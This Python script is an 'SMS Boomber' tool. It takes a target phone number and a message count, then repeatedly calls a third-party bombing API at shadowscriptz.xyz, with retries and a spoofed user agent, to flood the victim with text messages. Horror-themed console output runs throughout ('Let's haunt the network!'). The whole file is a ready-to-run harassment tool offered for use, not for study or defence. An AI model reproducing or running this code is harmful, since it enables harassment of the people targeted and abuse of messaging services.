#!/usr/bin/env python3
import requests
import time
import os
import sys
from colorama import Fore, Style, init
import json
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from tqdm import tqdm

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Horror-themed ASCII art (skull with dripping blood, Silent Hill vibe)
ASCII_ART = f"""
{Fore.RED}
       _____
      /     \\ 
     /_______\\
     |  ***  | 
     |  ***  | 
     |_______|
     |  ***  | 
     |  ***  | 
     |_______|
     |  ***  | 
     |  ***  | 
     |_______|
    /|  ***  |\\ 
   / |_______| \\ 
  /_____________\\
     |  ***  | 
     |  ***  | 
     |_______|
{Fore.GREEN} SMS Boomber v1.0
{Fore.CYAN}  Created By Vigenere Anonymous
{Style.RESET_ALL}
"""

# API endpoint
API_URL = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"

# Log file for debugging
LOG_FILE = "sms_ghost.log"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_header():
    clear_screen()
    print(ASCII_ART)

def log_message(message):
    """Log messages to a file for debugging."""
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")

def send_sms(phone_number, retries=3):
    """Summon SMS payload with retry logic."""
    api_number = phone_number.lstrip('+').strip()
    params = {"number": api_number}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36",
        "Accept": "application/json"
    }

    # Set up retry strategy
    session = requests.Session()
    retry = Retry(total=retries, backoff_factor=2, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('https://', adapter)

    for attempt in range(retries):
        try:
            response = session.get(API_URL, params=params, headers=headers, timeout=30)
            

            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get("status") == "Send" or "Sent" in response.text.lower() or response.text.strip():
                        print(f"{Fore.GREEN}[+] Message Successfully Sent to {phone_number}")
                        log_message(f"Success: SMS sent to {phone_number}")
                        return True
                    else:
                        print(f"{Fore.RED}[-] Payload failed: {data.get('message', 'Unknown error')}")
                        log_message(f"Failure: {data.get('message', 'Unknown error')}")
                        return False
                except json.JSONDecodeError:
                    if response.text.strip():
                        print(f"{Fore.GREEN}[+] Message successfully Send to {phone_number} (haunted response)")
                        log_message(f"Success (non-JSON): SMS sent to {phone_number}")
                        return True
                    else:
                        print(f"{Fore.RED}[-] failed: try Again")
                        log_message("Failure: Empty response")
                        return False
            else:
                print(f"{Fore.RED}[-] API cursed: HTTP {response.status_code}")
                log_message(f"HTTP Error: {response.status_code}")
                return False
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Connection cursed (attempt {attempt+1}/{retries}): {e}")
            log_message(f"Connection error: {e}")
            if attempt < retries - 1:
                print(f"{Fore.MAGENTA}[*] Retrying in {2**(attempt+1)} seconds...")
                time.sleep(2**(attempt+1))
            continue
    print(f"{Fore.RED}[-] All retries cursed for {phone_number}")
    log_message(f"All retries failed for {phone_number}")
    return False

def validate_phone_number(phone):
    """Validate target endpoint format."""
    cleaned_phone = phone.lstrip('+').strip()
    if not cleaned_phone.isdigit() or len(cleaned_phone) < 10 or len(cleaned_phone) > 14:
        return False, phone
    return True, '+' + cleaned_phone

def auto_start_countdown():
    """Summon the haunted terminal with a countdown."""
    print(f"{Fore.MAGENTA}[*] Ready  SMS Boomber...")
    for i in tqdm(range(3, 0, -1), desc=f"{Fore.MAGENTA}Summoning", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        print(f"{Fore.MAGENTA}[*] {i}...")
        time.sleep(1)
    print(f"{Fore.GREEN}[+] Terminal possessed. Let’s haunt the network!")

def main():
    # Automatic start countdown
    print_header()
    auto_start_countdown()

    while True:
        print_header()
        print(f"{Fore.CYAN}[*] Enter Number (e.g., +923001234567 or 923001234567) or 'q'")
        phone_input = input(f"{Fore.WHITE}Target: {Style.RESET_ALL}").strip()

        if phone_input.lower() == 'q':
            print(f"{Fore.MAGENTA}[*] Good Byee, bro.")
            log_message("User exited the tool")
            break

        is_valid, phone_number = validate_phone_number(phone_input)
        if not is_valid:
            print(f"{Fore.RED}[-] Invalid endpoint. Use 10-14 digits, with or without '+'.")
            log_message(f"Invalid phone number: {phone_input}")
            input(f"{Fore.MAGENTA}[*] Press Enter to retry...")
            continue

        print(f"{Fore.CYAN}[*] Enter Number count (1-10): ")
        try:
            sms_count = int(input(f"{Fore.WHITE}Count: {Style.RESET_ALL}"))
            if sms_count < 1 or sms_count > 10:
                print(f"{Fore.RED}[-] Payload count must be 1-10.")
                log_message(f"Invalid SMS count: {sms_count}")
                input(f"{Fore.MAGENTA}[*] Press Enter to retry...")
                continue
        except ValueError:
            print(f"{Fore.RED}[-] Invalid input. Enter a number (1-10).")
            log_message("Invalid SMS count input")
            input(f"{Fore.MAGENTA}[*] Press Enter to retry...")
            continue

        print(f"{Fore.CYAN}[*] Sending {sms_count} Messages to {phone_number}...")
        success_count = 0

        for i in tqdm(range(sms_count), desc=f"{Fore.MAGENTA}Processing", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
            print(f"{Fore.MAGENTA}[*] Sending Messages {i+1}/{sms_count}...")
            if send_sms(phone_number):
                success_count += 1
            time.sleep(5)  # Delay to avoid rate limiting

        
        log_message(f"Summary: {success_count}/{sms_count} SMS sent to {phone_number}")
        
        print(f"{Fore.CYAN}[*] Continue the Tool? (y/n)")
        if input(f"{Fore.WHITE}Choice: {Style.RESET_ALL}").strip().lower() != 'y':
            print(f"{Fore.MAGENTA}[*] Good Byeeee. Stay healthy, bro.")
            log_message("User exited the tool")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.MAGENTA}[*] SIGINT detected. Fading into the fog...")
        log_message("Interrupted by user")
        sys.exit(0)